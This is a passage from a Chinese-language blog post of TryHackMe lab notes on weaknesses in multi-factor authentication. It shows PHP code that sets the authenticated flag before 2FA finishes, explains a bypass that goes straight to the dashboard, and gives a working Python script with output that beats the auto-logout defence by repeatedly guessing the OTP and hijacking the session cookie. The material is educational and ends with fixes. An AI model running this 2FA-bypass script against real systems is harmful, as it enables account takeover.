+<p>攻击者可能会尝试操纵 URL 或完全绕过 OTP 步骤，而不是输入 OTP。例如，攻击者可能会尝试直接访问仪表板 URL（例如 <code>http://mfa.thm/labs/second/dashboard</code>），而无需完成所需的身份验证步骤。</p>
+<p>如果应用程序未正确检查会话状态或强制执行双重身份验证 (2FA)，或者应用程序的逻辑存在缺陷，攻击者可能会获得仪表板的访问权限。</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1725365434195.png" alt="img"></p>
+<h3 id="深入代码"><a href="#深入代码" class="headerlink" title="深入代码"></a>深入代码</h3><p>以下代码是 <strong>/mfa</strong> 页面中使用的部分代码。如您所见，**$_SESSION[‘authenticated’]** 是在 2FA 流程完成后发出的。</p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># Function that verifies the submitted 2FA token</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verify_2fa_code</span>(<span class="params"><span class="variable">$code</span></span>) </span>{</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">'token'</span>]))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$code</span> === <span class="variable">$_SESSION</span>[<span class="string">'token'</span>];</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function called in the /mfa page</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">verify_2fa_code</span>(<span class="variable">$_POST</span>[<span class="string">'code'</span>])) { <span class="comment">#If successful, the user will be redirected to the dashboard.</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">'authenticated'</span>] = <span class="literal">true</span>; <span class="comment"># Session that is used to check if the user completed the 2FA</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">'Location: '</span> . ROOT_DIR . <span class="string">'/dashboard'</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>考虑到上述实现是安全的，在认证的第一步之后悬空签发**$_SESSION[‘authenticated’]**的一些实例将绕过上述代码，如下所示。</p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">authenticate</span>(<span class="params"><span class="variable">$email</span>, <span class="variable">$password</span></span>)</span>{</span><br><span class="line">  <span class="variable">$pdo</span> = <span class="title function_ invoke__">get_db_connection</span>();</span><br><span class="line">  <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">"SELECT `password` FROM users WHERE email = :email"</span>);</span><br><span class="line">  <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="string">'email'</span> =&gt; <span class="variable">$email</span>]);</span><br><span class="line">  <span class="variable">$user</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$user</span> &amp;&amp; <span class="title function_ invoke__">password_verify</span>(<span class="variable">$password</span>, <span class="variable">$user</span>[<span class="string">'password'</span>]);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">authenticate</span>(<span class="variable">$email</span>, <span class="variable">$password</span>)) {</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">'authenticated'</span>] = <span class="literal">true</span>; <span class="comment"># This flag should only be issued after the MFA completion</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">'email'</span>] = <span class="variable">$_POST</span>[<span class="string">'email'</span>];</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">'Location: '</span> . ROOT_DIR . <span class="string">'/mfa'</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>由于应用程序的仪表盘仅检查 $_SESSION[‘authenticated’] 的值，无论其为真还是假，攻击者都可以轻松绕过双重身份验证 (2FA) 页面，因为攻击者事先了解应用程序的端点。</p>
+<p>为了修复此漏洞，身份验证检查中使用的 Cookie 或会话应分为两部分。第一部分是在用户名和密码验证成功后设置会话的部分；此会话的唯一目的是提交双重身份验证 (2FA) 令牌。第二部分应仅在一次性密码 (OTP) 验证后设置。</p>
+<h1 id="Practical-Beating-the-Auto-Logout-Feature"><a href="#Practical-Beating-the-Auto-Logout-Feature" class="headerlink" title="Practical - Beating the Auto-Logout Feature"></a>Practical - Beating the Auto-Logout Feature</h1><p>在某些应用程序中，双重身份验证 (2FA) 验证失败会导致应用程序将用户恢复到身份验证过程的第一部分（即使用用户名和密码的初始登录）。此行为通常是由于应用程序的安全机制旨在防止针对双重身份验证 (2FA) 部分进行暴力破解攻击。应用程序可能会强制用户重新进行身份验证，以确保尝试登录的用户确实是合法用户，而不是试图猜测一次性密码 (OTP) 的攻击者。</p>
+<h3 id="导致此行为的常见原因"><a href="#导致此行为的常见原因" class="headerlink" title="导致此行为的常见原因"></a>导致此行为的常见原因</h3><p><strong>会话失效</strong></p>
+<p>双重身份验证 (2FA) 验证失败后，应用程序可能会出于安全措施使用户会话失效，从而强制用户从头开始身份验证过程。</p>
+<p><strong>限速和锁定策略</strong></p>
+<p>为了防止攻击者反复尝试绕过双重身份验证 (2FA)，应用程序可能设置了限速或锁定机制，这些机制会在一定次数的失败尝试后触发，将用户恢复到初始登录步骤。</p>
+<p><strong>安全驱动的重定向</strong></p>
+<p>某些应用程序设计为在多次双重身份验证失败后将用户重定向回登录页面，作为一项额外的安全措施，确保在允许再次进行双重身份验证尝试之前，用户的凭据经过重新验证。</p>
+<h3 id="自动化是关键"><a href="#自动化是关键" class="headerlink" title="自动化是关键"></a>自动化是关键</h3><p>自动化使攻击此类保护措施变得更容易，因为：</p>
+<p><strong>速度</strong></p>
+<p>每次退出后手动重新登录既缓慢又繁琐。自动化可以更快地为您完成这项工作。</p>
+<p><strong>一致性</strong></p>
+<p>自动化可以避免您反复执行相同操作时可能出现的错误。它非常可靠。</p>
+<p><strong>从退出状态恢复</strong></p>
+<p>如果应用程序在几次尝试失败后将您退出，脚本可以自动重新登录并继续尝试。这省去了您每次手动操作的麻烦。</p>
+<p><strong>自定义</strong></p>
+<p>手动创建自动化攻击脚本比使用 ZAP 或 Burp Suite 等单一工具更灵活。您可以自定义脚本以测试特定场景，例如使用不同的 IP 地址或用户代理，或调整请求间隔。</p>
+<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>托管在 <a target="_blank" rel="noopener" href="http://mfa.thm/labs/third">http://mfa.thm/labs/third</a> 的应用程序会在用户未通过双重身份验证 (2FA) 时自动注销用户。为了演示，该应用程序还会在用户每次登录时生成一个 4 位 PIN 码。</p>
+<p><strong>注意</strong>：在实际应用中，PIN 码通常在 0000 到 9999 之间。我们将其设置为较低的值只是为了节省暴力破解的时间。</p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateToken</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1250</span>, <span class="number">1350</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">'token'</span>] = <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'success'</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>使用下面的 Python 脚本，将脚本保存为 <strong>exploit.py</strong> 并在终端中运行它。</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define the URLs for the login, 2FA process, and dashboard</span></span><br><span class="line">login_url = <span class="string">'http://mfa.thm/labs/third/'</span></span><br><span class="line">otp_url = <span class="string">'http://mfa.thm/labs/third/mfa'</span></span><br><span class="line">dashboard_url = <span class="string">'http://mfa.thm/labs/third/dashboard'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define login credentials</span></span><br><span class="line">credentials = {</span><br><span class="line">    <span class="string">'email'</span>: <span class="string">'thm@mail.thm'</span>,</span><br><span class="line">    <span class="string">'password'</span>: <span class="string">'test123'</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define the headers to mimic a real browser</span></span><br><span class="line">headers = {</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'</span>,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: <span class="string">'en-US,en;q=0.5'</span>,</span><br><span class="line">    <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">    <span class="string">'Origin'</span>: <span class="string">'http://mfa.thm'</span>,</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'close'</span>,</span><br><span class="line">    <span class="string">'Referer'</span>: <span class="string">'http://mfa.thm/labs/third/mfa'</span>,</span><br><span class="line">    <span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to check if the response contains the login page</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_login_successful</span>(<span class="params">response</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"User Verification"</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> response.status_code == <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to handle the login process</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">session</span>):</span><br><span class="line">    response = session.post(login_url, data=credentials, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line">  </span><br><span class="line"><span class="comment"># Function to handle the 2FA process</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit_otp</span>(<span class="params">session, otp</span>):</span><br><span class="line">    <span class="comment"># Split the OTP into individual digits</span></span><br><span class="line">    otp_data = {</span><br><span class="line">        <span class="string">'code-1'</span>: otp[<span class="number">0</span>],</span><br><span class="line">        <span class="string">'code-2'</span>: otp[<span class="number">1</span>],</span><br><span class="line">        <span class="string">'code-3'</span>: otp[<span class="number">2</span>],</span><br><span class="line">        <span class="string">'code-4'</span>: otp[<span class="number">3</span>]</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    response = session.post(otp_url, data=otp_data, headers=headers, allow_redirects=<span class="literal">False</span>)  <span class="comment"># Disable auto redirects</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"DEBUG: OTP submission response status code: <span class="subst">{response.status_code}</span>"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to check if the response contains the login page</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_login_page</span>(<span class="params">response</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Sign in to your account"</span> <span class="keyword">in</span> response.text <span class="keyword">or</span> <span class="string">"Login"</span> <span class="keyword">in</span> response.text</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to attempt login and submit the hardcoded OTP until success</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_until_success</span>():</span><br><span class="line">    otp_str = <span class="string">'1337'</span>  <span class="comment"># Hardcoded OTP</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:  <span class="comment"># Keep trying until success</span></span><br><span class="line">        session = requests.Session()  <span class="comment"># Create a new session object for each attempt</span></span><br><span class="line">        login_response = login(session)  <span class="comment"># Log in before each OTP attempt</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> is_login_successful(login_response):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Logged in successfully."</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Failed to log in."</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"Trying OTP: <span class="subst">{otp_str}</span>"</span>)</span><br><span class="line"></span><br><span class="line">        response = submit_otp(session, otp_str)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Check if the response is the login page (unsuccessful OTP)</span></span><br><span class="line">        <span class="keyword">if</span> is_login_page(response):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"Unsuccessful OTP attempt, redirected to login page. OTP: <span class="subst">{otp_str}</span>"</span>)</span><br><span class="line">            <span class="keyword">continue</span>  <span class="comment"># Retry login and OTP submission</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Check if the response is a redirect (status code 302)</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">302</span>:</span><br><span class="line">            location_header = response.headers.get(<span class="string">'Location'</span>, <span class="string">''</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"Session cookies: <span class="subst">{session.cookies.get_dict()}</span>"</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Check if it successfully bypassed 2FA and landed on the dashboard</span></span><br><span class="line">            <span class="keyword">if</span> location_header == <span class="string">'/labs/third/dashboard'</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f"Successfully bypassed 2FA with OTP: <span class="subst">{otp_str}</span>"</span>)</span><br><span class="line">                <span class="keyword">return</span> session.cookies.get_dict()  <span class="comment"># Return session cookies after successful bypass</span></span><br><span class="line">            <span class="keyword">elif</span> location_header == <span class="string">'/labs/third/'</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f"Failed OTP attempt. Redirected to login. OTP: <span class="subst">{otp_str}</span>"</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f"Unexpected redirect location: <span class="subst">{location_header}</span>. OTP: <span class="subst">{otp_str}</span>"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"Received status code <span class="subst">{response.status_code}</span>. Retrying..."</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Start the attack to try until success</span></span><br><span class="line">try_until_success()</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">脚本设置</span><br><span class="line"></span><br><span class="line">URL：</span><br><span class="line"></span><br><span class="line">login_url：用户输入邮箱和密码的登录页面 URL。</span><br><span class="line">otp_url：用户提交 4 位 OTP 进行验证的 URL。</span><br><span class="line">dashboard_url：用户身份验证成功后重定向到的仪表盘 URL。</span><br><span class="line">Credentials：</span><br><span class="line"></span><br><span class="line">credentials 字典包含用于登录的邮箱和密码。</span><br><span class="line">Headers：</span><br><span class="line"></span><br><span class="line">Headers 字典包含模拟真实浏览器请求的 HTTP 标头，包括 User-Agent、Referer、Content-Type 等。</span><br><span class="line">函数</span><br><span class="line"></span><br><span class="line">is_login_successful(response)：</span><br><span class="line"></span><br><span class="line">通过在响应文本中查找短语“用户验证”并确保状态码为 200 OK 来检查登录是否成功。</span><br><span class="line">login(session)：</span><br><span class="line"></span><br><span class="line">通过向 login_url 发送包含用户凭证的 POST 请求来执行登录。它会返回服务器的响应。</span><br><span class="line">submit_otp(session, otp):</span><br><span class="line"></span><br><span class="line">通过 POST 请求将 4 位 OTP 发送至 otp_url。OTP 会被拆分成多个数字，并作为单独的参数（code-1、code-2 等）发送。该函数返回服务器的响应。</span><br><span class="line">is_login_page(response):</span><br><span class="line"></span><br><span class="line">通过在响应文本中查找“登录您的账户”或“登录”等关键字，检查响应是否包含登录页面。</span><br><span class="line">暴力破解过程</span><br><span class="line"></span><br><span class="line">OTP 范围：</span><br><span class="line"></span><br><span class="line">脚本循环执行，直到应用程序返回与脚本中设置的 OTP 相同的 OTP。</span><br><span class="line">会话创建：</span><br><span class="line"></span><br><span class="line">每次 OTP 尝试，都会使用 request.Session() 创建一个新会话，确保每次登录和 OTP 提交尝试都会创建一个新的会话。</span><br><span class="line">登录尝试：</span><br><span class="line"></span><br><span class="line">脚本尝试使用提供的凭据登录。如果登录成功，则会打印“已成功登录”并继续提交 OTP。如果登录失败，脚本将跳至下一次 OTP 尝试。</span><br><span class="line">OTP 提交：</span><br><span class="line"></span><br><span class="line">脚本将 OTP 格式化为 4 位字符串，并将其发送至 otp_url。</span><br><span class="line">响应处理：</span><br><span class="line"></span><br><span class="line">如果服务器响应包含登录页面（表示 OTP 尝试失败），脚本将打印错误消息并继续执行下一次 OTP。</span><br><span class="line">如果响应包含 302 Found 状态码（表示重定向），脚本将检查 Location 标头：</span><br><span class="line">如果重定向到 /labs/third/dashboard，则表示 OTP 绕过成功，脚本将打印成功消息并退出。</span><br><span class="line">如果重定向到 /labs/third/（登录页面），则表示 OTP 失败，脚本将打印错误消息。</span><br><span class="line">任何其他重定向位置都会被标记为意外，并打印错误消息。</span><br><span class="line">如果响应包含任何其他状态码，脚本将打印该状态码并重试下一次 OTP。</span><br></pre></td></tr></tbody></table></figure>
+
+<p>一旦脚本成功破解正确的安全代码，即可登录应用程序。</p>
+<p>exploit.py</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@tryhackme$ $ python3 exploit.py</span><br><span class="line">Logged in successfully.</span><br><span class="line">Trying OTP: 1337</span><br><span class="line">DEBUG: OTP submission response status code: 302</span><br><span class="line">Unsuccessful OTP attempt, redirected to login page. OTP: 1337</span><br><span class="line">Logged in successfully.</span><br><span class="line">Trying OTP: 1337</span><br><span class="line">DEBUG: OTP submission response status code: 302</span><br><span class="line">Unsuccessful OTP attempt, redirected to login page. OTP: 1337</span><br><span class="line">Logged in successfully.</span><br><span class="line">Trying OTP: 1337</span><br><span class="line">DEBUG: OTP submission response status code: 302</span><br><span class="line">Session cookies: {'PHPSESSID': '57burqsvce3odaif2oqtptbl13'}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>使用新的 PHPSESSID，转到 <a target="_blank" rel="noopener" href="http://mfa.thm/labs/third%EF%BC%8C%E6%89%93%E5%BC%80%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%BC%80%E5%8F%91%E4%BA%BA%E5%91%98%E5%B7%A5%E5%85%B7%EF%BC%8C%E7%84%B6%E5%90%8E%E5%AF%BC%E8%88%AA%E5%88%B0%E5%AD%98%E5%82%A8">http://mfa.thm/labs/third，打开浏览器的开发人员工具，然后导航到存储</a> &gt; Cookies。</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1724895243670.png" alt="img"></p>
+<p>将 PHPSESSID 值替换为您终端上的 PHPSESSID。</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1724895244011.png" alt="img"></p>
+<p>完成后，转到<a target="_blank" rel="noopener" href="http://mfa.thm/labs/third/dashboard%E3%80%82">http://mfa.thm/labs/third/dashboard。</a></p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1725365483356.png" alt="img"></p>
+<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>在本专题中，我们介绍了多因素身份验证 (MFA) 和双因素身份验证 (2FA) 的基本知识，让您深入了解这些安全措施如何增强系统抵御未经授权访问的能力。</p>
+<h3 id="关键要点"><a href="#关键要点" class="headerlink" title="关键要点"></a>关键要点</h3><ul>
+<li><strong>了解 MFA</strong>：MFA 通过要求多种形式的验证来增加安全层级，从而显著降低未经授权访问的风险。</li>
+<li><strong>解决漏洞</strong>：诸如 OTP 算法薄弱和缺乏速率限制等常见问题可能会破坏安全性，因此需要强有力的实施实践。</li>
+<li><strong>最佳实践</strong>：安全的 OTP 生成、速率限制和用户教育对于维护有效的 MFA 系统至关重要。</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://blog.mikannse.cn">Mikannse</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://blog.mikannse.cn/2025/06/03/THMMulti-FactorAuthentication/">https://blog.mikannse.cn/2025/06/03/THMMulti-FactorAuthentication/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.mikannse.cn" target="_blank">MikannseのSekai</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2025/06/03/THMOAuthVulnerabilities/" title="THMOAuthVulnerabilities"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">THMOAuthVulnerabilities</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/06/15/AdvancedSQLInjectionTHM/" title="AdvancedSQLInjectionTHM"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-15</div><div class="title">AdvancedSQLInjectionTHM</div></div></a></div><div><a href="/2023/09/13/CVE-2016-4437shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="CVE-2016-4437shiro反序列化漏洞复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-13</div><div class="title">CVE-2016-4437shiro反序列化漏洞复现</div></div></a></div><div><a href="/2024/04/06/CVE-2019-11043PHP-FPM%E8%BF%9C%E7%A8%8BRCE%E5%A4%8D%E7%8E%B0/" title="CVE-2019-11043PHP-FPM远程RCE复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-06</div><div class="title">CVE-2019-11043PHP-FPM远程RCE复现</div></div></a></div><div><a href="/2025/04/24/CVE-2021-44228Log4j%E5%A4%8D%E7%8E%B0/" title="CVE-2021-44228Log4j复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-24</div><div class="title">CVE-2021-44228Log4j复现</div></div></a></div><div><a href="/2024/03/14/ContainerVulnerabilitiesTHM/" title="ContainerVulnerabilitiesTHM"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-14</div><div class="title">ContainerVulnerabilitiesTHM</div></div></a></div><div><a href="/2023/11/17/Cross-Site%20Scripting%20(XSS)HTB/" title="Cross-Site Scripting (XSS)HTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-17</div><div class="title">Cross-Site Scripting (XSS)HTB</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mikannse</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">325</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">74</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mikannse/mikannse.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">暂时没有公告QAQ</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87"><span class="toc-number">1.0.1.</span> <span class="toc-text">目标</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%88%E5%86%B3%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.0.2.</span> <span class="toc-text">先决条件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#How-MFA-Works"><span class="toc-number">2.</span> <span class="toc-text">How MFA Works</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E5%9B%A0%E7%B4%A0%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.0.1.</span> <span class="toc-text">身份验证因素的类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E9%87%8D%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81-2FA-%E7%9A%84%E7%A7%8D%E7%B1%BB"><span class="toc-number">2.0.2.</span> <span class="toc-text">双重身份验证 (2FA) 的种类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E8%AE%BF%E9%97%AE"><span class="toc-number">2.0.3.</span> <span class="toc-text">条件访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A8%E7%90%83%E9%87%87%E7%94%A8%E5%92%8C%E7%9B%91%E7%AE%A1%E6%8E%A8%E5%8A%A8"><span class="toc-number">2.0.4.</span> <span class="toc-text">全球采用和监管推动</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Implementations-and-Applications"><span class="toc-number">2.1.</span> <span class="toc-text">Implementations and Applications</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%93%B6%E8%A1%8C%E4%B8%9A%E4%B8%AD%E7%9A%84-MFA"><span class="toc-number">2.1.1.</span> <span class="toc-text">银行业中的 MFA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%BB%E7%96%97%E4%BF%9D%E5%81%A5%E4%B8%AD%E7%9A%84%E5%A4%9A%E9%87%8D%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81-MFA"><span class="toc-number">2.1.2.</span> <span class="toc-text">医疗保健中的多重身份验证 (MFA)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%81%E4%B8%9A-IT-%E4%B8%AD%E7%9A%84%E5%A4%9A%E9%87%8D%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81-MFA"><span class="toc-number">2.1.3.</span> <span class="toc-text">企业 IT 中的多重身份验证 (MFA)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Common-Vulnerabilities-in-MFA"><span class="toc-number">3.</span> <span class="toc-text">Common Vulnerabilities in MFA</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1-OTP-%E7%94%9F%E6%88%90%E7%AE%97%E6%B3%95"><span class="toc-number">3.0.1.</span> <span class="toc-text">弱 OTP 生成算法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%B3%84%E9%9C%B2%E5%8F%8C%E9%87%8D%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%BB%A4%E7%89%8C"><span 